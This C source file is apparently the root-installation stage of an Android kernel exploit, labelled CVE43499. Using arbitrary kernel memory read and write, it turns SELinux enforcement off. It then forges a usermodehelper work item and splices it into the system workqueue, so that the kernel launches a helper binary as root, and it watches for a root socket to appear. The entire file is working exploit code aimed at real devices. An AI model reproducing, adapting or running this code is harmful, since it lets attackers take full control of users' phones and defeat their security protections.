#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  root_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  return (uint32_t)root_read64(fd, target);
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_read8_exact(int fd, uintptr_t target, uint8_t *value) {
  *value = 0;
  return root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32_exact(int fd, uintptr_t target, uint32_t *value) {
  *value = 0;
  return root_read_data(fd, target, value, sizeof(*value));
}

static int root_read64_exact(int fd, uintptr_t target, uint64_t *value) {
  *value = 0;
  return root_read_data(fd, target, value, sizeof(*value));
}

static int root_write8_verified(int fd, uintptr_t target, uint8_t value) {
  uint8_t after = 0;
  root_write_data(fd, target, &value, sizeof(value));
  return root_read8_exact(fd, target, &after) && after == value;
}

static int root_write32_verified(int fd, uintptr_t target, uint32_t value) {
  uint32_t after = 0;
  root_write32(fd, target, value);
  return root_read32_exact(fd, target, &after) && after == value;
}

static int root_write64_verified(int fd, uintptr_t target, uint64_t value) {
  uint64_t after = 0;
  root_write64(fd, target, value);
  return root_read64_exact(fd, target, &after) && after == value;
}

static int root_restore8_if_owned(
    int fd, uintptr_t target, uint8_t original, uint8_t owned) {
  uint8_t current = 0;
  if (!root_read8_exact(fd, target, &current)) {
    return 0;
  }
  if (current == original) {
    return 1;
  }
  return current == owned && root_write8_verified(fd, target, original);
}

static int root_restore32_if_owned(
    int fd, uintptr_t target, uint32_t original, uint32_t owned) {
  uint32_t current = 0;
  if (!root_read32_exact(fd, target, &current)) {
    return 0;
  }
  if (current == original) {
    return 1;
  }
  return current == owned && root_write32_verified(fd, target, original);
}

static int root_restore64_if_owned(
    int fd, uintptr_t target, uint64_t original, uint64_t owned) {
  uint64_t current = 0;
  if (!root_read64_exact(fd, target, &current)) {
    return 0;
  }
  if (current == original) {
    return 1;
  }
  return current == owned && root_write64_verified(fd, target, original);
}

__attribute__((noreturn)) static void root_transaction_hold(
    const char *phase) {
  mark_exploit_safety(EXPLOIT_SAFETY_HOLD);
  pr_warning("root umh transaction uncertain phase=%s; holding all kernel "
             "backing references until reboot\n", phase);
  fflush(NULL);
  for (;;) {
    sleep(60);
  }
}

struct root_umh_transaction {
  uintptr_t selinux_addr;
  uintptr_t inflight_addr;
  uintptr_t active_addr;
  uintptr_t refcnt_addr;
  uintptr_t list_next_addr;
  uintptr_t list_prev_addr;
  uint8_t selinux_before;
  uint32_t inflight_before;
  uint32_t active_before;
  uint32_t refcnt_before;
  uint64_t list_next_before;
  uint64_t list_prev_before;
  uint64_t fake_entry;
  int selinux_attempted;
  int inflight_attempted;
  int active_attempted;
  int refcnt_attempted;
  int list_prev_attempted;
};

static int rollback_root_umh_transaction(
    int fd, const struct root_umh_transaction *tx) {
  if (tx->list_prev_attempted &&
      !root_restore64_if_owned(fd, tx->list_prev_addr,
                               tx->list_prev_before, tx->fake_entry)) {
    return 0;
  }
  if (tx->refcnt_attempted &&
      !root_restore32_if_owned(fd, tx->refcnt_addr, tx->refcnt_before,
                               tx->refcnt_before + 1)) {
    return 0;
  }
  if (tx->active_attempted &&
      !root_restore32_if_owned(fd, tx->active_addr, tx->active_before,
                               tx->active_before + 1)) {
    return 0;
  }
  if (tx->inflight_attempted &&
      !root_restore32_if_owned(fd, tx->inflight_addr,
                               tx->inflight_before,
                               tx->inflight_before + 1)) {
    return 0;
  }
  if (tx->selinux_attempted && tx->selinux_before != 0 &&
      !root_restore8_if_owned(fd, tx->selinux_addr,
                              tx->selinux_before, 0)) {
    return 0;
  }
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

static int __attribute__((unused)) root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}

static int __attribute__((unused))
install_workqueue_umh_root_unchecked(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_warning("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_warning("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  unlink(ROOT_SOCKET_PATH);
  ssize_t selinux_write = kernel_write_data(
      fd, selinux_addr, &permissive, sizeof(permissive));
  if (selinux_write != (ssize_t)sizeof(permissive)) {
    pr_warning("root umh selinux write failed ret=%zd\n", selinux_write);
    return 0;
  }

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uintptr_t wq = root_read64(fd, wq_slot);
  uintptr_t pwq = root_read64(fd, wq + WQ_DFL_PWQ_OFF);
  uintptr_t pool = root_read64(fd, pwq + PWQ_POOL_OFF);
  uintptr_t pwq_wq = root_read64(fd, pwq + PWQ_WQ_OFF);
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_warning("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    list_next = root_read64(fd, worklist);
    list_prev = root_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = root_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_warning("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  uint32_t color = root_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = root_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_warning("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = root_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  int counters_write =
      root_write32(fd, inflight_addr, nr_inflight + 1) &&
      root_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
      root_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  int list_prev_write = root_write64(
      fd, worklist + sizeof(uint64_t), fake_entry);
  int list_next_write = list_prev_write && root_write64(
      fd, worklist, fake_entry);
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          counters_write, list_prev_write, list_next_write);
  if (!data_write || !work_write || !counters_write || !list_next_write) {
    return 0;
  }

  uint32_t complete_done = 0;
  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      complete_done = root_read32(fd, completion_addr);
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int socket_ok = 0;
  int32_t umh_retval = (int32_t)root_read32(
      fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return socket_ok;
}

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_warning("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_warning("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uint64_t wq_raw = 0;
  uint64_t pwq_raw = 0;
  uint64_t pool_raw = 0;
  uint64_t pwq_wq_raw = 0;
  if (!root_read64_exact(fd, wq_slot, &wq_raw) ||
      !is_direct_ptr((uintptr_t)wq_raw) ||
      !root_read64_exact(fd, (uintptr_t)wq_raw + WQ_DFL_PWQ_OFF,
                         &pwq_raw) ||
      !is_direct_ptr((uintptr_t)pwq_raw) ||
      ((uintptr_t)pwq_raw & 0xff) != 0 ||
      !root_read64_exact(fd, (uintptr_t)pwq_raw + PWQ_POOL_OFF,
                         &pool_raw) ||
      !is_direct_ptr((uintptr_t)pool_raw) ||
      !root_read64_exact(fd, (uintptr_t)pwq_raw + PWQ_WQ_OFF,
                         &pwq_wq_raw) ||
      pwq_wq_raw != wq_raw) {
    pr_warning("root umh bad workqueue wq_slot=%016zx wq=%016llx "
               "pwq=%016llx pool=%016llx pwq_wq=%016llx\n",
               wq_slot, (unsigned long long)wq_raw,
               (unsigned long long)pwq_raw,
               (unsigned long long)pool_raw,
               (unsigned long long)pwq_wq_raw);
    return 0;
  }
  uintptr_t wq = (uintptr_t)wq_raw;
  uintptr_t pwq = (uintptr_t)pwq_raw;
  uintptr_t pool = (uintptr_t)pool_raw;
  uintptr_t worklist = pool + POOL_WORKLIST_OFF;

  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  int pool_ready = 0;
  for (int i = 0; i < 200; i++) {
    if (root_read64_exact(fd, worklist, &list_next) &&
        root_read64_exact(fd, worklist + sizeof(uint64_t), &list_prev) &&
        root_read32_exact(fd, pool + POOL_NR_IDLE_OFF, &nr_idle) &&
        list_next == worklist && list_prev == worklist && nr_idle > 0) {
      pool_ready = 1;
      break;
    }
    usleep(1000);
  }
  if (!pool_ready) {
    pr_warning("root umh pool busy pool=%016zx list=%016llx/%016llx "
               "head=%016zx idle=%u\n",
               pool, (unsigned long long)list_next,
               (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  if (!root_read32_exact(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
      !root_read32_exact(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
      !root_read32_exact(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
      !root_read32_exact(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) ||
      color >= 15 || refcnt == 0 || refcnt == UINT32_MAX ||
      nr_active >= max_active || nr_active == UINT32_MAX) {
    pr_warning("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
               color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  uint8_t selinux_before = 0;
  if (!root_read32_exact(fd, inflight_addr, &nr_inflight) ||
      nr_inflight == UINT32_MAX ||
      !root_read8_exact(fd, selinux_addr, &selinux_before)) {
    pr_warning("root umh cannot read transaction originals color=%u "
               "inflight=%u\n", color, nr_inflight);
    return 0;
  }

  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  struct umh_kernel_data umh_after;
  struct umh_subprocess_info work_after;
  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int data_read = root_read_data(
      fd, umh_data_addr, &umh_after, sizeof(umh_after));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  int work_read = root_read_data(
      fd, fake_work_addr, &work_after, sizeof(work_after));
  int data_staged = data_read &&
                    memcmp(&umh_after, &umh_data, sizeof(umh_data)) == 0;
  int work_staged = work_read &&
                    memcmp(&work_after, &fake, sizeof(fake)) == 0;
  if (!data_staged || !work_staged) {
    pr_warning("root umh staging failed data=%d/%d/%d work=%d/%d/%d\n",
               data_write, data_read, data_staged,
               work_write, work_read, work_staged);
    return 0;
  }

  unlink(ROOT_SOCKET_PATH);

  uint64_t check_next = 0;
  uint64_t check_prev = 0;
  uint32_t check_idle = 0;
  uint32_t check_color = 0;
  uint32_t check_refcnt = 0;
  uint32_t check_active = 0;
  uint32_t check_max_active = 0;
  uint32_t check_inflight = 0;
  uint8_t check_selinux = 0;
  if (!root_read64_exact(fd, worklist, &check_next) ||
      !root_read64_exact(fd, worklist + sizeof(uint64_t), &check_prev) ||
      !root_read32_exact(fd, pool + POOL_NR_IDLE_OFF, &check_idle) ||
      !root_read32_exact(fd, pwq + PWQ_WORK_COLOR_OFF, &check_color) ||
      !root_read32_exact(fd, pwq + PWQ_REFCNT_OFF, &check_refcnt) ||
      !root_read32_exact(fd, pwq + PWQ_NR_ACTIVE_OFF, &check_active) ||
      !root_read32_exact(fd, pwq + PWQ_MAX_ACTIVE_OFF, &check_max_active) ||
      !root_read32_exact(fd, inflight_addr, &check_inflight) ||
      !root_read8_exact(fd, selinux_addr, &check_selinux) ||
      check_next != list_next || check_prev != list_prev || check_idle == 0 ||
      check_color != color || check_refcnt != refcnt ||
      check_active != nr_active || check_max_active != max_active ||
      check_inflight != nr_inflight || check_selinux != selinux_before) {
    pr_warning("root umh transaction drift before commit list=%016llx/%016llx "
               "idle=%u color=%u ref=%u active=%u/%u inflight=%u se=%u\n",
               (unsigned long long)check_next,
               (unsigned long long)check_prev, check_idle, check_color,
               check_refcnt, check_active, check_max_active,
               check_inflight, check_selinux);
    return 0;
  }

  struct root_umh_transaction tx = {
      .selinux_addr = selinux_addr,
      .inflight_addr = inflight_addr,
      .active_addr = pwq + PWQ_NR_ACTIVE_OFF,
      .refcnt_addr = pwq + PWQ_REFCNT_OFF,
      .list_next_addr = worklist,
      .list_prev_addr = worklist + sizeof(uint64_t),
      .selinux_before = selinux_before,
      .inflight_before = nr_inflight,
      .active_before = nr_active,
      .refcnt_before = refcnt,
      .list_next_before = list_next,
      .list_prev_before = list_prev,
      .fake_entry = fake_entry,
  };
  const char *failed_phase = NULL;

  if (selinux_before != 0) {
    tx.selinux_attempted = 1;
    if (!root_write8_verified(fd, selinux_addr, 0)) {
      failed_phase = "selinux";
      goto prepublish_failure;
    }
  }
  tx.inflight_attempted = 1;
  if (!root_write32_verified(fd, inflight_addr, nr_inflight + 1)) {
    failed_phase = "inflight";
    goto prepublish_failure;
  }
  tx.active_attempted = 1;
  if (!root_write32_verified(fd, tx.active_addr, nr_active + 1)) {
    failed_phase = "active";
    goto prepublish_failure;
  }
  tx.refcnt_attempted = 1;
  if (!root_write32_verified(fd, tx.refcnt_addr, refcnt + 1)) {
    failed_phase = "refcnt";
    goto prepublish_failure;
  }
  tx.list_prev_attempted = 1;
  if (!root_write64_verified(fd, tx.list_prev_addr, fake_entry)) {
    failed_phase = "list-prev";
    goto prepublish_failure;
  }

  int list_next_write = root_write64(fd, tx.list_next_addr, fake_entry);
  uint64_t list_next_after = 0;
  int list_next_read = root_read64_exact(
      fd, tx.list_next_addr, &list_next_after);
  int published = list_next_write ||
                  (list_next_read && list_next_after == fake_entry);
  if (!published) {
    if (list_next_read && list_next_after == tx.list_next_before) {
      failed_phase = "list-next-not-published";
      goto prepublish_failure;
    }
    root_transaction_hold("list-next-ambiguous");
  }

  pr_info("root umh published wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "list_next=%d/%d/%016llx\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, list_next_write, list_next_read,
          (unsigned long long)list_next_after);

  uint32_t complete_done = 0;
  uint64_t completion_polls = 0;
  int wake_ok = 0;
  int completion_wait_logged = 0;
  for (;;) {
    if ((completion_polls % 250) == 0) {
      wake_ok |= wake_system_unbound();
    }
    if (root_read32_exact(fd, completion_addr, &complete_done) &&
        complete_done != 0) {
      break;
    }
    completion_polls++;
    if (completion_polls >= 2000 && !completion_wait_logged) {
      pr_warning("root umh published but completion is still pending; "
                 "continuing to hold backing references\n");
      completion_wait_logged = 1;
    }
    usleep(1000);
  }

  uint32_t retval_raw = 0;
  int retval_read = root_read32_exact(
      fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval),
      &retval_raw);
  int32_t umh_retval = (int32_t)retval_raw;
  int socket_ok = 0;
  for (int i = 0; i < 500; i++) {
    if (root_socket_ready()) {
      socket_ok = 1;
      break;
    }
    usleep(10000);
  }
  pr_info("root umh result wake=%d complete=%u polls=%llu "
          "retval=%d/%d socket=%d\n",
          wake_ok, complete_done, (unsigned long long)completion_polls,
          retval_read, umh_retval, socket_ok);

  if (!socket_ok) {
    if (tx.selinux_attempted && tx.selinux_before != 0 &&
        !root_restore8_if_owned(fd, tx.selinux_addr,
                                tx.selinux_before, 0)) {
      root_transaction_hold("post-completion-selinux-restore");
    }
    root_child_done = 0;
    root_uid_after = root_uid_before;
    return 0;
  }

  root_child_done = 1;
  root_uid_after = 0;
  return 1;

prepublish_failure:
  if (!rollback_root_umh_transaction(fd, &tx)) {
    root_transaction_hold(failed_phase ? failed_phase : "rollback");
  }
  pr_warning("root umh transaction rolled back before publication phase=%s\n",
             failed_phase ? failed_phase : "unknown");
  root_child_done = 0;
  root_uid_after = root_uid_before;
  return 0;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_workqueue_umh_root(fd);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
  return installed;
}
